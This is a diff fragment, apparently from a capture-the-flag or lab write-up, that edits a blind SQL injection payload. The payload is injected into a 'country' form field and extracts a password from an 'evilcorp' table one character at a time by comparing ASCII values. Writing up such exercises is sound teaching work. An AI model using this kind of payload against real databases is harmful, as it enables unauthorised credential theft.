@@ -292,7 +292,7 @@ We see only dump_115 was written, so the first character must be an 's'
 
 Let's find the second character 
 
-name=dumptwo100&country=' OR ASCII(SUBSTRING((SELECT password FROM evilcorp LIMIT 1), 2, 1)) = 100) -- -
+name=dumptwo100&country=' OR ASCII(SUBSTRING((SELECT password FROM evilcorp LIMIT 0,1), 2, 1)) = 100) -- -
 
 ?location=1
 
